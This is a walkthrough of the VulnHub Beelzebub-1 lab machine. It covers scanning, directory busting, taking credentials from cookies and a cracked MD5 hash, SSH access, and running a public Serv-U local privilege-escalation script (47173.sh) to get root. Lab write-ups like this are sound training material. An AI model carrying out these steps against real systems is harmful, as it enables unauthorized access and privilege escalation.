---
layout: post
title: VulnHub Beelzebub-1 Writeup
categories: VulnHub Machines
permalink: /vulnhub/beelzebub-1
---

## Nmap

```bash
Nmap 7.94SVN scan initiated Fri Jan 10 21:45:50 2025 as: /usr/lib/nmap/nmap -Pn -p- -A --min-rate 5000 -oN scan.txt 192.168.56.139
Nmap scan report for 192.168.56.139
Host is up (0.00092s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)
|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)
|_  256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 08:00:27:C6:99:AD (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.92 ms 192.168.56.139

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan 10 21:46:03 2025 -- 1 IP address (1 host up) scanned in 12.55 seconds
```

There are only two ports open on the server ssh and http. Since ssh is not as interesting to enumerate let’s go ahead and enumerate the http server.

![1](https://github.com/user-attachments/assets/8ab517f9-8a1e-4ea7-9be8-152e94b5981e)


We are greeted with the default apache page. Looking around the page and the source code there isn’t much to be found and there is not /robots.txt either. So it seems we need to perform some directory busting. So let’s go ahead and do that.

```bash
feroxbuster -u http://192.168.56.139 -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -x txt,zip,php,sh -n                 
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.139
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, zip, php, sh]
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       15l       74w     6147c http://192.168.56.139/icons/ubuntu-logo.png
200      GET       10l       30w      271c http://192.168.56.139/index.php
200      GET      375l      964w    10918c http://192.168.56.139/
301      GET        9l       28w      321c http://192.168.56.139/javascript => http://192.168.56.139/javascript/
301      GET        9l       28w      321c http://192.168.56.139/phpmyadmin => http://192.168.56.139/phpmyadmin/
200      GET     1170l     5860w    95428c http://192.168.56.139/phpinfo.php
[####################] - 2m   1102770/1102770 0s      found:6       errors:3      
[####################] - 2m   1102725/1102725 12186/s http://192.168.56.139/
```

We are not able to find many directories. Let’s go ahead and look at index.php to see what we can find.

![2](https://github.com/user-attachments/assets/7b2063c2-f6e5-40e3-9e7d-362da06a50b0)


It gives us a 404 page which is weird because feroxbuster shows a 200 status for this page. Looking deeper into the source code we find.

```bash
<!--My heart was encrypted, "beelzebub" somehow hacked and decoded it.-md5-->
```

It seems we need to do something using the md5 hash of the “beelzebub” string.

```bash
d18e1e22becbd915b45e0e655429d487
```

```bash
feroxbuster -u http://192.168.56.139/d18e1e22becbd915b45e0e655429d487 -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -x txt,zip,php,sh -n
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.139/d18e1e22becbd915b45e0e655429d487
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, zip, php, sh]
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      343c http://192.168.56.139/d18e1e22becbd915b45e0e655429d487 => http://192.168.56.139/d18e1e22becbd915b45e0e655429d487/
200      GET      385l     3179w    19935c http://192.168.56.139/d18e1e22becbd915b45e0e655429d487/license.txt
301      GET        9l       28w      355c http://192.168.56.139/d18e1e22becbd915b45e0e655429d487/wp-includes => http://192.168.56.139/d18e1e22becbd915b45e0e655429d487/wp-includes/
301      GET        9l       28w      354c http://192.168.56.139/d18e1e22becbd915b45e0e655429d487/wp-content => http://192.168.56.139/d18e1e22becbd915b45e0e655429d487/wp-content/
200      GET       87l      302w     5694c http://192.168.56.139/d18e1e22becbd915b45e0e655429d487/wp-login.php
200      GET      341l     3880w    57718c http://192.168.56.139/d18e1e22becbd915b45e0e655429d487/index.php
404      GET        5l       15w      135c http://192.168.56.139/d18e1e22becbd915b45e0e655429d487/wp-trackback.php
301      GET        9l       28w      352c http://192.168.56.139/d18e1e22becbd915b45e0e655429d487/wp-admin => http://192.168.56.139/d18e1e22becbd915b45e0e655429d487/wp-admin/
405      GET        1l        6w       42c http://192.168.56.139/d18e1e22becbd915b45e0e655429d487/xmlrpc.php
302      GET        0l        0w        0c http://192.168.56.139/d18e1e22becbd915b45e0e655429d487/wp-signup.php => http://192.168.1.6/d18e1e22becbd915b45e0e655429d487/wp-login.php?action=register
[####################] - 2m   1102775/1102775 0s      found:10      errors:1      
[####################] - 2m   1102725/1102725 10864/s http://192.168.56.139/d18e1e22becbd915b45e0e655429d487/
```

Running feroxbuster on that endpoint reveals a wordpress blog. Let’s try and see if we can access the /wp-content/uploads endpoint.

![3](https://github.com/user-attachments/assets/b0f2c3d3-1485-47e0-a4e3-1d41ee90d0a4)


It seems we are able to. After taking a look at both the folders. The only one with interesting content is the Talk to VALAK endpoint.

![4](https://github.com/user-attachments/assets/dc888751-d476-4c0d-ab6a-fad64ebe78d3)


We are greeted with this page. There seems to be a user input field. Let’s see what it does.

![5](https://github.com/user-attachments/assets/5b6375d7-ed2a-4b07-b419-3f77a68b8342)


It seems that our input is being reflected back into the browser. Let’s take a look at the request in burpsuite to see what we can find.

```bash
POST /d18e1e22becbd915b45e0e655429d487/wp-content/uploads/Talk%20To%20VALAK/index.php HTTP/1.1
Host: 192.168.56.139
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.56.139/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/Talk%20To%20VALAK/index.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Origin: http://192.168.56.139
Connection: keep-alive
Cookie: Cookie=b7d0eff31b9cde9a862dc157bb33ec2a; Password=M4k3Ad3a1
Upgrade-Insecure-Requests: 1
Priority: u=0, i

name=a
```

If we look at the Cookies, we can see that we were given two cookies, an MD5 hash and a password. Let’s try putting the hash on crackstation to see if we can find a match.

![6](https://github.com/user-attachments/assets/2234899d-c215-4f59-9871-04658984d0ed)


And we are able to find a match. Let’s use that as our username and try to ssh into the system.

```bash
ssh krampus@192.168.56.139  
krampus@192.168.56.139's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.3.0-53-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

294 packages can be updated.
178 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2023.
Last login: Sat Mar 20 00:38:04 2021 from 192.168.1.7
krampus@beelzebub:~$ id
uid=1000(krampus) gid=1000(krampus) groups=1000(krampus),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare)
krampus@beelzebub:~$ cat Desktop/user.txt 
aq12uu909a0q921a2819b05568a992m9
```

There we go, we were able to login as krampus. Now let’s enumerate the machine to escalate our privileges. 

After looking around I wasn’t able to find much so I decided to use linpeas and managed to find something interesting.

```bash
╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                                                                                           
  Group krampus:                                                                                                                                                                                                                            
/tmp/linpeas.sh                                                                                                                                                                                                                             
/var/www/html/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/Talk To VALAK
/var/www/html/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/Talk To VALAK/log.php
/var/www/html/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/Talk To VALAK/index.php
/var/www/html/d18e1e22becbd915b45e0e655429d487/wp-config.php
/home/krampus
  Group www-data:
/var/tmp                                                                                                                                                                                                                                    
/var/mail
/var/local
<SNIP>
/var/spool/cron/crontabs
```

It seems that the group www-data has write access to the /var/spool/cron/crontabs folder. We could use this to set up a cronjob for the root user to make it run our malicious script as root.

After looking at it, it seems the file was owned by www-data and not root, so the cronjob wouldn’t run. So back to linpeas, I noticed something else.

```bash
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                                                                               
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                                                                                                                                           
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:43958         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 ::1:43958               :::*                    LISTEN      -                   
tcp6       0      0 ::1:631                 :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -
```

There was a port that stood out 43958. After googling what it was for I found out it was used by the Serv-U File Server. So I forwarded that port to my local machine using ssh.

```bash
ssh -L 43958:localhost:43958 krampus@192.168.56.139
```

![7](https://github.com/user-attachments/assets/8c209205-c40f-4df5-93bc-ac1927df0931)


We are greeted with this page. I tried logging in using krampus’s credentials but that didn’t work. Since the version was visible I tried to see if I could find an exploit for this version of Serv-U.

```bash
searchsploit serv-u
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
<SNIP>
Serv-U FTP Server < 15.1.7 - Local Privilege Escalation (1)                                                                                                                                               | linux/local/47009.c
Serv-U FTP Server < 15.1.7 - Local Privilege Escalation (2)                                                                                                                                               | multiple/local/47173.sh
<SNIP>
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

I was able to find these two scripts for local privilege escalation. I decided to use the .sh since it would be easier.

```bash
krampus@beelzebub:/tmp$ ./47173.sh 
[*] Launching Serv-U ...
sh: 1: : Permission denied
[+] Success:
-rwsr-xr-x 1 root root 1113504 Jan 11 06:16 /tmp/sh
[*] Launching root shell: /tmp/sh
sh-4.4# whoami
root
sh-4.4# cd /root
sh-4.4# ls
root.txt
sh-4.4# cat root.txt 
8955qpasq8qq807879p75e1rr24cr1a5
sh-4.4# 
```

After running the script we get root.
